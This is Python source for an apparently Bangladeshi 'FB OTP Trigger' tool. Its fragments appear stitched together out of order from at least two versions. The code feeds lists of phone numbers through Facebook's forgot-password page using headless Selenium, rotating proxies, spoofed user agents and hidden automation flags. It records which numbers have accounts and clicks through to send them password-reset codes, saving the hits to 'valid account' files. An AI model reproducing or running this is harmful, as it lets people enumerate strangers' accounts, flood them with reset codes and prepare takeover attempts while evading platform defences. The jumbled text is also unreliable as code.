            input(f"\n  {Y}Press Enter...{X}")
        
        elif choice == "0":
            print(f"\n  {G}👋 Bye!{X}")
            break

# ==================== ENTRY ====================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {Y}🛑 Interrupted.{X}")
    except Exception as e:
        print(f"\n\n  {R}❌ Fatal: {e}{X}")
        import traceback
        traceback.print_exc()except ImportError as e:
    print(f"❌ Missing: {e}")
    print("\nRun: pip install selenium webdriver-manager phonenumbers requests beautifulsoup4")
    sys.exit(1)

# ==================== CONFIG ====================

RESULTS_FILE = "fb_results.json"
VALID_FILE = "valid_accounts.txt"
NUMBERS_FILE = "numbers.txt"
VERSION = "3.0"

# ==================== PHONE NORMALIZER (যেকোনো ফরম্যাট নেবে) ====================

def normalize_phone(text: str) -> Optional[str]:
    """
    + ছাড়া, কমা ছাড়া, স্পেস সহ যেকোনো ফরম্যাট নিবে
    উদাহরণ: 8801712345678, 01712345678, +8801712345678, +880 1712-345678
    সবগুলোই কাজ করবে
    """
    # শুধু ডিজিট রাখি
    digits = re.sub(r'[^\d]', '', text)
    
    if not digits or len(digits) < 10:
        return None
    
    # বাংলাদেশ
    if len(digits) == 11 and digits.startswith('01'):
        return f"+88{digits}"
    elif len(digits) == 13 and digits.startswith('8801'):
        return f"+{digits}"
    # USA
    elif len(digits) == 10:
        return f"+1{digits}"
    elif len(digits) == 11 and digits.startswith('1'):
        return f"+{digits}"
    # UK
    elif len(digits) == 12 and digits.startswith('44'):
        return f"+{digits}"
    # India
    elif len(digits) == 12 and digits.startswith('91'):
        return f"+{digits}"
    # Generic
    elif len(digits) >= 10 and len(digits) <= 15:
        return f"+{digits}"
    
    return None

# ==================== PROXY MANAGER ====================

class ProxyManager:
    def __init__(self):
        self.proxies: List[str] = []
        self.index = 0
        self.lock = threading.Lock()
        self._load()
    
    def _load(self):
        if os.path.exists("proxies.txt"):
            with open("proxies.txt") as f:
                self.proxies = [
                    line.strip() for line in f 
                    if line.strip() and not line.startswith("#")
                ]
        if not self.proxies:
            self.proxies = [
                "http://103.153.154.110:80",
                "http://103.174.102.127:80",
            ]
    
    def get(self) -> Optional[str]:
        with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p
    
    def add(self, proxy: str):
        with self.lock:
            self.proxies.append(proxy)
            with open("proxies.txt", "a") as f:
                f.write(f"{proxy}\n")
            print(f"  ✅ Proxy added: {proxy}")
    
    def count(self) -> int:
        return len(self.proxies)

# ==================== FACEBOOK OTP TRIGGER ====================

class FBOTPTrigger:
    """
    Facebook forgot password page এ নাম্বার দিয়ে OTP ট্রিগার করবে
    OTP যাবে ঐ নাম্বারের registered SMS/email এ
    """
    
    def __init__(self, proxy_manager: ProxyManager):
        self.pm = proxy_manager
        self.stats = {"checked": 0, "otp_sent": 0, "found": 0, "errors": 0}
    
    def _create_driver(self):
        options = Options()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--headless")
        options.add_argument("--window-size=1366,768")
        options.add_argument("--disable-notifications")
        options.add_argument("--lang=en-US")
        
        proxy = self.pm.get()
        if proxy:
            options.add_argument(f"--proxy-server={proxy}")
        
        # Random user agent
        ua = random.choice([
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
        ])
        options.add_argument(f"--user-agent={ua}")
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver
    
    def check_and_trigger_otp(self, phone: str) -> Dict:
        """
        Main function:
        1. Facebook forgot password page খুলবে
        2. নাম্বার ইনপুট দিবে
        3. Account খুঁজে বের করবে
        4. OTP সেন্ড করবে (যদি account থাকে)
        """
        result = {
            "phone": phone,
            "status": "PENDING",
            "has_account": False,
            "otp_triggered": False,
            "details": "",
            "timestamp": datetime.now().isoformat()
        }
        
        driver = None
        try:
            driver = self._create_driver()
            
            # Step 1: Forgot password page
            driver.get("https://www.facebook.com/login/identify/")
            time.sleep(3 + random.random() * 2)
            
            # Step 2: Enter phone number
            try:
                phone_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "phone_number"))
                )
                phone_input.clear()
                phone_input.send_keys(phone)
            except:
                result["status"] = "⚠️ INPUT ERROR"
                result["details"] = "Could not find phone input field"
                self.stats["errors"] += 1
                return result
            
            # Step 3: Click Search
            try:
                search_btn = driver.find_element(By.NAME, "did_submit")
                search_btn.click()
                time.sleep(4)
            except:
                result["status"] = "⚠️ SEARCH ERROR"
                self.stats["errors"] += 1
                return result
            
            # Step 4: Analyze result
            page_source = driver.page_source.lower()
            
            # Check if account exists (success indicators)
            account_found_signals = [
                "continue", "নিশ্চিত করুন", "send code", "কোড পাঠান",
                "password", "পাসওয়ার্ড", "code", "কোড", "reset",
                "রিসেট", "confirm", "কনফার্ম", "enter code",
                "কোড লিখুন", "this phone number", "এই নাম্বার",
                "send security code", "সিকিউরিটি কোড পাঠান",
                "text me a code", "reset your password",
                "find your account", "we found", "আপনার",
            ]
            
            no_account_signals = [
                "no account found", "অ্যাকাউন্ট পাওয়া যায়নি",
                "couldn't find", "not found", "খুঁজে পাওয়া যায়নি",
                "no results", "কোন ফল নেই",
                "enter a different", "ভিন্ন নম্বর",
            ]
            
            has_account = any(s in page_source for s in account_found_signals)
            no_account = any(s in page_source for s in no_account_signals)
            
            if has_account and not no_account:
                result["has_account"] = True
                result["status"] = "✅ VALID ACCOUNT"
                self.stats["found"] += 1
                
                # Step 5: Try to trigger OTP by clicking submit/continue
                otp_triggered = False
                button_xpaths = [
                    "//button[contains(text(), 'Continue')]",
                    "//button[contains(text(), 'নিশ্চিত')]",
                    "//button[contains(text(), 'Send')]",
                    "//button[contains(text(), 'কোড')]",
                    "//button[contains(text(), 'পাঠান')]",
                    "//button[contains(text(), 'Submit')]",
                    "//button[contains(text(), 'Search')]",
                    "//button[contains(text(), 'খুঁজুন')]",
                    "//input[@type='submit']",
                    "//button[@type='submit']",
                ]
                
                for xpath in button_xpaths:
                    try:
                        btn = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.XPATH, xpath))
                        )
                        driver.execute_script("arguments[0].click();", btn)
                        time.sleep(2)
                        result["otp_triggered"] = True
                        result["status"] = "✅ OTP TRIGGERED!"
                        result["details"] = f"Clicked: {xpath}"
                        self.stats["otp_sent"] += 1
                        break
                    except:
                        continue
                
                if not result["otp_triggered"]:
                    # যদি button না পাওয়া যায়, তাহলে try alternative method
                    try:
                        # Try any available button or link
                        all_buttons = driver.find_elements(By.TAG_NAME, "button")
                        for btn in all_buttons:
                            try:
                                if btn.is_displayed() and btn.is_enabled():
                                    driver.execute_script("arguments[0].click();", btn)
                                    time.sleep(2)
                                    result["otp_triggered"] = True
                                    result["status"] = "✅ OTP TRIGGERED!"
                                    result["details"] = f"Clicked button: {btn.text[:30]}"
                                    self.stats["otp_sent"] += 1
                                    break
                            except:
                                continue
                    except:
                        pass
                
                if not result["otp_triggered"]:
                    result["status"] = "✅ FOUND (auto-OTP fail)"
                    result["details"] = "Manual OTP needed from FB page"
            
            elif no_account:
                result["status"] = "❌ NO ACCOUNT"
                result["details"] = "Phone not registered with Facebook"
            else:
                # Ambiguous - might be rate limited
                result["status"] = "⚠️ UNKNOWN"
                result["details"] = "Could not determine - possibly rate limited"
            
            self.stats["checked"] += 1
            
        except Exception as e:
            result["status"] = f"⚠️ ERROR"
            result["details"] = str(e)[:80]
            self.stats["errors"] += 1
        
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
        
        return result

# ==================== MAIN APP ====================

class FBOTPApp:
    def __init__(self):
        self.pm = ProxyManager()
        self.queue = queue.Queue()
        self.results: List[Dict] = []
        self.total = 0
        self.found = 0
        self.otp_sent = 0
        self.start_time = None
        self.running = False
        self.lock = threading.Lock()
    
    def add_numbers(self, text: str) -> int:
        """যেকোনো ফরম্যাটে নাম্বার নিবে"""
        # কমা, স্পেস, নিউলাইন সব দিয়েই আলাদা করা যাবে
        parts = re.split(r'[,;\n\s\r\t]+', text)
        count = 0
        for part in parts:
            part = part.strip()
            if not part:
                continue
            phone = normalize_phone(part)
            if phone:
                self.queue.put(phone)
                count += 1
        return count
    
    def load_file(self, filename: str = None) -> int:
        if not filename:
            filename = NUMBERS_FILE
        if not os.path.exists(filename):
            print(f"  ❌ File '{filename}' not found!")
            return 0
        
        count = 0
        with open(filename, "r") as f:
            for line in f:
                phone = normalize_phone(line.strip())
                if phone:
                    self.queue.put(phone)
                    count += 1
        print(f"  📂 Loaded {count} numbers from {filename}")
        return count
    
    def _worker(self, tid: int):
        checker = FBOTPTrigger(self.pm)
        
        while self.running and not self.queue.empty():
            try:
                phone = self.queue.get_nowait()
            except queue.Empty:
                break
            
            result = checker.check_and_trigger_otp(phone)
            
            with self.lock:
                self.results.append(result)
                self.total += 1
                if result["has_account"]:
                    self.found += 1
                if result["otp_triggered"]:
                    self.otp_sent += 1
                    
                    # Save valid immediately
                    with open(VALID_FILE, "a") as f:
                        f.write(f"{result['phone']} | OTP_SENT | {result['timestamp']}\n")
                
                # Show progress
                elapsed = time.time() - self.start_time
                rate = self.total / elapsed if elapsed > 0 else 0
                
                status_icon = "✅" if "OTP" in result["status"] else \
                              "🔍" if "VALID" in result["status"] else \
                              "❌" if "NO" in result["status"] else "⚠️"
                
                print(
                    f"\r  [{tid}] {status_icon} {result['phone']:20s} | "
                    f"{result['status'][:30]:30s} | "
                    f"📊 {self.total}/{self.total + self.queue.qsize()} | "
                    f"✅ {self.found} | 📱 {self.otp_sent} OTP | ⚡{rate:.1f}/s   ",
                    end="", flush=True
                )
            
            # Auto-save every 10
            if self.total % 10 == 0:
                self._save()
            
            time.sleep(2 + random.random())
    
    def _save(self):
        try:
            with open(RESULTS_FILE, "w") as f:
                json.dump({
                    "stats": {"total": self.total, "found": self.found, "otp_sent": self.otp_sent},
                    "results": self.results
                }, f, indent=2, ensure_ascii=False)
        except:
            pass
    
    def start(self, threads: int = 3):
        if self.queue.empty():
            print("\n  ❌ No numbers to check! Add numbers first.\n")
            return
        
        self.running = True
        self.start_time = time.time()
        
        total_q = self.queue.qsize()
        
        print(f"\n{'='*55}")
        print(f"  🚀 FB OTP TRIGGER TOOL v{VERSION}")
        print(f"{'='*55}")
        print(f"  📱 Queue: {total_q} numbers")
        print(f"  🧵 Threads: {threads}")
        print(f"  🔌 Proxies: {self.pm.count()}")
        print(f"{'='*55}\n")
        
        threads_list = []
        for i in range(threads):
            t = threading.Thread(target=self._worker, args=(i+1,), daemon=True)
            t.start()
            threads_list.append(t)
        
        try:
            for t in threads_list:
                t.join()
        except KeyboardInterrupt:
            print("\n\n  🛑 Stopping...")
            self.running = False
        
        self.running = False
        self._save()
        
        elapsed = time.time() - self.start_time
        print(f"\n\n{'='*55}")
        print(f"  ✅ COMPLETE!")
        print(f"{'='*55}")
        print(f"  📊 Checked: {self.total}")
        print(f"  🔍 Accounts Found: {self.found}")
        print(f"  📱 OTP Triggered: {self.otp_sent}")
        print(f"  ⏱️  Time: {elapsed:.1f}s")
        print(f"  ⚡ Speed: {self.total/elapsed:.1f}/s" if elapsed > 0 else "")
        print(f"{'='*55}")
        
        # Show valid accounts
        valid = [r for r in self.results if r["has_account"]]
        if valid:
            print(f"\n  🎯 ACCOUNTS WITH OTP TRIGGERED:")
            for r in valid:
                otp_icon = "📱" if r["otp_triggered"] else "🔍"
                print(f"    {otp_icon} {r['phone']} | {r['status']}")
        
        print(f"\n  💾 Results saved to {RESULTS_FILE}")
        print(f"  💾 Valid accounts saved to {VALID_FILE}")

# ==================== CLI ====================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""
╔══════════════════════════════════════╗
║   🔥 FB OTP TRIGGER v{VERSION}          ║
║   Termux Edition                     ║
║   Multi-Thread + Proxy               ║
║   Author: cybersecuritybhau-maker     ║
╚══════════════════════════════════════╝
""")

def setup():
    if not os.path.exists("proxies.txt"):
        with open("proxies.txt", "w") as f:
            f.write("# Proxy list\nhttp://103.153.154.110:80\nhttp://103.174.102.127:80\n")

def main():
    setup()
    app = FBOTPApp()
    
    while True:
        banner()
        print("  MAIN MENU:")
        print("  1. 📱  Add numbers (যেকোনো ফরম্যাটে)")
        print("  2. 📂  Load from file")
        print("  3. 🔌  Proxy management")
        print("  4. 🚀  START CHECKING")
        print("  5. 📊  Show results")
        print("  6. 💾  Save & Export")
        print("  0. ❌  Exit")
        
        choice = input("\n  👉 Select: ").strip()
        
        if choice == "1":
            banner()
            print("  📱 Enter phone numbers:")
            print("     যেকোনো ফরম্যাটে দিন:")
            print("     01712345678, +8801712345678, 8801712345678")
            print("     অথবা স্পেস দিয়ে: 0171 0191 88017")
            print()
            text = input("  📱 Numbers: ").strip()
            if text:
                count = app.add_numbers(text)
                print(f"\n  ✅ {count} numbers added to queue!")
            else:
                print("\n  ❌ No input!")
            input("\n  Press Enter...")
        
        elif choice == "2":
            banner()
            f = input(f"  📂 File (default {NUMBERS_FILE}): ").strip()
            app.load_file(f if f else None)
            input("\n  Press Enter...")
        
        elif choice == "3":
            banner()
            print(f"  🔌 Proxies: {app.pm.count()}")
            print("  1. Show all")
            print("  2. Add proxy")
            pc = input("\n  Select: ").strip()
            if pc == "1":
                print(f"\n  Proxies: {app.pm.count()}")
            elif pc == "2":
                p = input("  Enter proxy (http://IP:PORT): ").strip()
                if p:
                    app.pm.add(p)
            input("\n  Press Enter...")
        
        elif choice == "4":
            banner()
            if app.queue.empty():
                print("  ❌ Queue empty! Add numbers first.")
                input("\n  Press Enter...")
                continue
            
            try:
                t = input(f"  Threads (1-10, default 3): ").strip()
                threads = max(1, min(10, int(t) if t else 3))
            except:
                threads = 3
            
            app.start(threads=threads)
            input("\n  Press Enter...")
        
        elif choice == "5":
            banner()
            print(f"  📊 RESULTS:\n")
            print(f"  📱 Total checked: {app.total}")
            print(f"  🔍 Accounts found: {app.found}")
            print(f"  📱 OTP triggered: {app.otp_sent}")
            
            valid = [r for r in app.results if r["has_account"]]
            if valid:
                print(f"\n  🎯 VALID ACCOUNTS ({len(valid)}):")
                for r in valid:
                    print(f"    {'📱' if r['otp_triggered'] else '🔍'} {r['phone']} | {r['status']}")
            
            input("\n  Press Enter...")
        
        elif choice == "6":
            app._save()
            print(f"\n  ✅ Saved to {RESULTS_FILE} and {VALID_FILE}")
            input("\n  Press Enter...")
        
        elif choice == "0":
            print("\n  👋 Exiting...")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  🛑 Bye!")
    except Exception as e:
        print(f"\n  ❌ Error: {e}")
        import traceback
        traceback.print_exc()
missing = []
for mod_name, pip_name in REQUIRED_MODULES.items():
    try:
        __import__(mod_name)
    except ImportError:
        missing.append(pip_name)

if missing:
    print(f"❌ Missing modules: {', '.join(missing)}")
    print(f"   Run: pip install {' '.join(missing)}")
    sys.exit(1)

import phonenumbers
from phonenumbers import geocoder, carrier
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# ==================== CONFIGURATION ====================

VERSION = "2.0"
CONFIG = {
    "max_threads": 5,
    "delay": 2,
    "timeout": 15,
    "headless": True,
    "results_file": "fb_results.json",
    "valid_file": "valid_fb_accounts.txt",
    "proxy_file": "proxies.txt",
    "numbers_file": "numbers.txt"
}

# User agents rotation
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; OnePlus 9) AppleWebKit/537.36",
]

# ==================== PROXY MANAGER ====================

class ProxyManager:
    """Manage proxy rotation"""
    
    def __init__(self):
        self.proxies: List[str] = []
        self._lock = threading.Lock()
        self._index = 0
        self.load_from_file()
    
    def load_from_file(self) -> int:
        """Load proxies from file"""
        self.proxies.clear()
        
        if os.path.exists(CONFIG["proxy_file"]):
            try:
                with open(CONFIG["proxy_file"], "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            self.proxies.append(line)
                print(f"📂 Loaded {len(self.proxies)} proxies from {CONFIG['proxy_file']}")
            except Exception as e:
                print(f"⚠️ Error loading proxies: {e}")
        
        # Default proxies if empty
        if not self.proxies:
            self.proxies = [
                "http://103.153.154.110:80",
                "http://103.174.102.127:80",
                "http://47.74.135.104:8888",
                "http://103.152.232.107:80",
                "http://103.152.112.122:80",
            ]
            print(f"📂 Using {len(self.proxies)} default proxies")
        
        return len(self.proxies)
    
    def get_next(self) -> Optional[str]:
        """Get next proxy (round-robin)"""
        if not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
            return proxy
    
    def add(self, proxy: str):
        """Add proxy at runtime"""
        with self._lock:
            self.proxies.append(proxy)
            try:
                with open(CONFIG["proxy_file"], "a") as f:
                    f.write(f"{proxy}\n")
            except:
                pass
            print(f"✅ Proxy added: {proxy}")
    
    def remove(self, index: int) -> bool:
        """Remove proxy by index"""
        with self._lock:
            if 0 <= index < len(self.proxies):
                removed = self.proxies.pop(index)
                print(f"🗑️ Removed proxy: {removed}")
                return True
            return False
    
    def test(self, proxy: str) -> bool:
        """Test if proxy works"""
        try:
            import requests
            r = requests.get(
                "http://httpbin.org/ip",
                proxies={"http": proxy, "https": proxy},
                timeout=5
            )
            return r.status_code == 200
        except:
            return False
    
    def count(self) -> int:
        return len(self.proxies)
    
    def display(self):
        """Display all proxies"""
        if not self.proxies:
            print("❌ No proxies configured!")
            print("   Add to proxies.txt or use option 3")
            return
        
        print(f"\n{'='*50}")
        print(f"🔌 Proxy List ({len(self.proxies)} proxies)")
        print(f"{'='*50}")
        
        for i, p in enumerate(self.proxies, 1):
            status = "✅" if self.test(p) else "⚠️"
            print(f"  {i:2d}. {status} {p}")
        
        print(f"{'='*50}")

# ==================== PHONE NORMALIZER ====================

class PhoneNormalizer:
    """Normalize worldwide phone numbers"""
    
    COUNTRY_PATTERNS = [
        (r'^\+?8801\d{9}$', 'BD', 'Bangladesh'),
        (r'^\+?1\d{10}$', 'US', 'USA/Canada'),
        (r'^\+?44\d{10}$', 'GB', 'United Kingdom'),
        (r'^\+?91\d{10}$', 'IN', 'India'),
        (r'^\+?92\d{10}$', 'PK', 'Pakistan'),
        (r'^\+?971\d{9}$', 'AE', 'UAE'),
        (r'^\+?966\d{9}$', 'SA', 'Saudi Arabia'),
        (r'^\+?971\d{9}$', 'AE', 'UAE'),
        (r'^\+?8801\d{9}$', 'BD', 'Bangladesh'),
    ]
    
    @staticmethod
    def normalize(phone: str) -> Optional[str]:
        """
        Normalize phone number to E.164 format
        Returns None if invalid
        """
        # Remove all non-digit except +
        phone = re.sub(r'[^\d+]', '', phone)
        
        # Try phonenumbers library first
        try:
            parsed = phonenumbers.parse(phone)
            if phonenumbers.is_valid_number(parsed):
                formatted = phonenumbers.format_number(
                    parsed, phonenumbers.PhoneNumberFormat.E164
                )
                return formatted
        except:
            pass
        
        # Manual normalization patterns
        # Bangladesh: 01XXXXXXXXX -> +8801XXXXXXXXX
        if re.match(r'^01\d{9}$', phone):
            return f"+88{phone}"
        
        # USA: 1XXXXXXXXXX -> +1XXXXXXXXXX
        if re.match(r'^1\d{10}$', phone):
            return f"+{phone}"
        
        # UK: 07XXXXXXXXX -> +447XXXXXXXXX
        if re.match(r'^07\d{9}$', phone):
            return f"+44{phone[1:]}"
        
        # India: 9XXXXXXXXX -> +919XXXXXXXXX
        if re.match(r'^[6-9]\d{9}$', phone):
            return f"+91{phone}"
        
        # Already has + prefix
        if phone.startswith('+') and len(phone) >= 8 and len(phone) <= 15:
            return phone
        
        # 10 digit number (default to BD with 88)
        if len(phone) == 10:
            return f"+88{phone}"
        
        return None
    
    @staticmethod
    def get_country(phone: str) -> str:
        """Get country name from phone"""
        try:
            parsed = phonenumbers.parse(phone)
            return geocoder.description_for_number(parsed, "en")
        except:
            return "Unknown"
    
    @staticmethod
    def get_carrier(phone: str) -> str:
        """Get carrier name"""
        try:
            parsed = phonenumbers.parse(phone)
            return carrier.name_for_number(parsed, "en")
        except:
            return "Unknown"

# ==================== FACEBOOK CHECKER ====================

class FacebookChecker:
    """Check Facebook account by phone number"""
    
    FB_IDENTIFY_URL = "https://www.facebook.com/login/identify/"
    
    VALID_SIGNALS = [
        "continue", "নিশ্চিত করুন", "send code", "কোড পাঠান",
        "password", "পাসওয়ার্ড", "code", "কোড", "reset",
        "রিসেট", "রিসেট করুন", "confirm identity", "enter code",
        "enter the code", "কোড লিখুন", "new password",
    ]
    
    INVALID_SIGNALS = [
        "no account found", "অ্যাকাউন্ট পাওয়া যায়নি",
        "couldn't find", "not found", "খুঁজে পাওয়া যায়নি",
        "no search results", "কোন ফলাফল নেই",
    ]
    
    OTP_BUTTONS = [
        "//button[contains(text(), 'Continue')]",
        "//button[contains(text(), 'নিশ্চিত')]",
        "//button[contains(text(), 'Send')]",
        "//button[contains(text(), 'কোড')]",
        "//button[contains(text(), 'পাঠান')]",
        "//button[contains(text(), 'Submit')]",
        "//button[contains(text(), 'জমা')]",
        "//div[@role='button']//span[contains(text(), 'Continue')]",
        "//div[@role='button']//span[contains(text(), 'নিশ্চিত')]",
    ]
    
    def __init__(self, proxy_manager: ProxyManager, thread_id: int):
        self.proxy_manager = proxy_manager
        self.thread_id = thread_id
        self.stats = {"checked": 0, "valid": 0, "errors": 0}
    
    def _create_driver(self) -> webdriver.Chrome:
        """Create Chrome WebDriver instance"""
        options = Options()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-notifications")
        options.add_argument("--disable-popup-blocking")
        options.add_argument(f"--user-agent={random.choice(USER_AGENTS)}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option("useAutomationExtension", False)
        
        if CONFIG.get("headless", True):
            options.add_argument("--headless")
        
        proxy = self.proxy_manager.get_next()
        if proxy:
            options.add_argument(f"--proxy-server={proxy}")
        
        try:
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            driver.execute_script(
                "Object.defineProperty(navigator, 'webdriver', "
                "{get: () => undefined})"
            )
            return driver
        except Exception as e:
            raise RuntimeError(f"Failed to create driver: {e}")
    
    def check(self, phone: str) -> Dict:
        """
        Check if phone has Facebook account
        Returns result dict
        """
        result = {
            "phone": phone,
            "country": PhoneNormalizer.get_country(phone),
            "carrier": PhoneNormalizer.get_carrier(phone),
            "status": "PENDING",
            "proxy": None,
            "thread": self.thread_id,
            "timestamp": datetime.now().isoformat()
        }
        
        driver = None
        try:
            driver = self._create_driver()
            result["proxy"] = driver.capabilities.get("proxy", {}).get("httpProxy", "None")
            
            # Step 1: Go to Facebook
            driver.get(self.FB_IDENTIFY_URL)
            time.sleep(2 + random.random() * 2)
            
            # Step 2: Enter phone
            phone_input = WebDriverWait(driver, CONFIG["timeout"]).until(
                EC.presence_of_element_located((By.NAME, "phone_number"))
            )
            phone_input.clear()
            phone_input.send_keys(phone)
            
            # Step 3: Click search
            search_btn = driver.find_element(By.NAME, "did_submit")
            search_btn.click()
            time.sleep(3 + random.random() * 2)
            
            # Step 4: Analyze response
            page_text = driver.page_source.lower()
            
            # Check for invalid first
            if any(sig in page_text for sig in self.INVALID_SIGNALS):
                result["status"] = "❌ NO ACCOUNT"
            elif any(sig in page_text for sig in self.VALID_SIGNALS):
                # Account found! Try OTP
                result = self._trigger_otp(driver, result)
            else:
                # Ambiguous - could be blocked or no result
                result["status"] = "⚠️ UNKNOWN"
            
            self.stats["checked"] += 1
            if "VALID" in result["status"]:
                self.stats["valid"] += 1
            elif "ERROR" in result["status"]:
                self.stats["errors"] += 1
        
        except Exception as e:
            result["status"] = f"⚠️ ERROR: {str(e)[:60]}"
            self.stats["errors"] += 1
        
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
        
        return result
    
    def _trigger_otp(self, driver: webdriver.Chrome, result: Dict) -> Dict:
        """Try to trigger OTP send"""
        for btn_xpath in self.OTP_BUTTONS:
            try:
                otp_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, btn_xpath))
                )
                driver.execute_script("arguments[0].click();", otp_btn)
                time.sleep(2)
                
                # Check if OTP was sent
                page_text = driver.page_source.lower()
                if any(x in page_text for x in ["code sent", "কোড পাঠানো", "sent", "পাঠানো"]):
                    result["status"] = "✅ VALID - OTP SENT ✅"
                else:
                    result["status"] = "✅ VALID - ACCOUNT FOUND"
                
                return result
            except:
                continue
        
        result["status"] = "✅ VALID - ACCOUNT FOUND"
        return result

# ==================== MAIN APPLICATION ====================

class FBCheckerApp:
    """Main application controller"""
    
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.phone_queue = queue_module.Queue()
        self.results: List[Dict] = []
        self.total_checked = 0
        self.total_valid = 0
        self.start_time = None
        self.is_running = False
        self._lock = threading.Lock()
        self._checkers: List[FacebookChecker] = []
    
    def add_numbers_manual(self, text: str) -> int:
        """Add manually entered numbers"""
        count = 0
        for part in re.split(r'[,;\n\s]+', text):
            part = part.strip()
            if not part:
                continue
            phone = PhoneNormalizer.normalize(part)
            if phone:
                self.phone_queue.put(phone)
                count += 1
            else:
                print(f"⚠️ Invalid number skipped: {part}")
        return count
    
    def load_numbers_from_file(self, filename: str = None) -> int:
        """Load numbers from file"""
        if not filename:
            filename = CONFIG["numbers_file"]
        
        if not os.path.exists(filename):
            print(f"❌ File not found: {filename}")
            return 0
        
        count = 0
        try:
            with open(filename, "r") as f:
                for line in f:
                    phone = PhoneNormalizer.normalize(line.strip())
                    if phone:
                        self.phone_queue.put(phone)
                        count += 1
            print(f"📂 Loaded {count} numbers from {filename}")
        except Exception as e:
            print(f"⚠️ Error reading file: {e}")
        
        return count
    
    def _worker(self, thread_id: int):
        """Worker thread function"""
        checker = FacebookChecker(self.proxy_manager, thread_id)
        self._checkers.append(checker)
        
        while self.is_running and not self.phone_queue.empty():
            try:
                phone = self.phone_queue.get_nowait()
            except queue_module.Empty:
                break
            
            result = checker.check(phone)
            
            with self._lock:
                self.results.append(result)
                self.total_checked += 1
                if "VALID" in result["status"]:
                    self.total_valid += 1
                    self._save_valid_instant(result)
                
                # Show progress
                if self.total_checked % 3 == 0 or "VALID" in result["status"]:
                    self._show_progress()
            
            # Auto-save
            if self.total_checked % 20 == 0:
                self.save_results()
            
            # Delay
            time.sleep(CONFIG.get("delay", 2))
    
    def _show_progress(self):
        """Display current progress"""
        elapsed = time.time() - self.start_time
        rate = self.total_checked / elapsed if elapsed > 0 else 0
        remaining = self.phone_queue.qsize()
        eta = remaining / rate if rate > 0 else 0
        
        print(
            f"\r[{datetime.now().strftime('%H:%M:%S')}] "
            f"📊 Checked: {self.total_checked} "
            f"✅ Valid: {self.total_valid} "
            f"⏳ Queue: {remaining} "
            f"⚡ {rate:.1f}/s "
            f"⏱️ ETA: {eta:.0f}s      ",
            end="", flush=True
        )
    
    def _save_valid_instant(self, result: Dict):
        """Save valid account immediately"""
        try:
            line = (
                f"{result['phone']} | "
                f"{result['country']} | "
                f"{result['carrier']} | "
                f"{result['status']} | "
                f"{result['timestamp']}\n"
            )
            with open(CONFIG["valid_file"], "a") as f:
                f.write(line)
        except:
            pass
    
    def start(self, threads: int = None):
        """Start checking"""
        if self.phone_queue.empty():
            print("❌ No numbers in queue!")
            return False
        
        if not threads:
            threads = CONFIG.get("max_threads", 5)
        
        threads = max(1, min(threads, 20))
        
        self.is_running = True
        self.start_time = time.time()
        
        total_numbers = self.phone_queue.qsize()
        
        print(f"\n{'='*55}")
        print(f"🚀 STARTING FB PHONE CHECKER v{VERSION}")
        print(f"{'='*55}")
        print(f"📱 Numbers: {total_numbers}")
        print(f"🧵 Threads: {threads}")
        print(f"🔌 Proxies: {self.proxy_manager.count()}")
        print(f"⏱️  Delay: {CONFIG.get('delay', 2)}s")
        print(f"📁 Results: {CONFIG['results_file']}")
        print(f"📁 Valid: {CONFIG['valid_file']}")
        print(f"{'='*55}\n")
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=self._worker, args=(i+1,), daemon=True)
            t.start()
            thread_list.append(t)
        
        try:
            for t in thread_list:
                t.join()
        except KeyboardInterrupt:
            print("\n\n🛑 Keyboard interrupt received. Stopping...")
            self.is_running = False
        
        self.is_running = False
        self.save_results()
        
        elapsed = time.time() - self.start_time
        rate = self.total_checked / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{'='*55}")
        print(f"✅ COMPLETE!")
        print(f"{'='*55}")
        print(f"📊 Total checked: {self.total_checked}")
        print(f"✅ Valid found: {self.total_valid}")
        print(f"⏱️  Time: {elapsed:.1f}s")
        print(f"⚡ Speed: {rate:.1f}/s")
        print(f"{'='*55}")
        
        # Show valid accounts
        if self.total_valid > 0:
            print(f"\n🎯 VALID ACCOUNTS:")
            print(f"{'='*55}")
            for r in self.results:
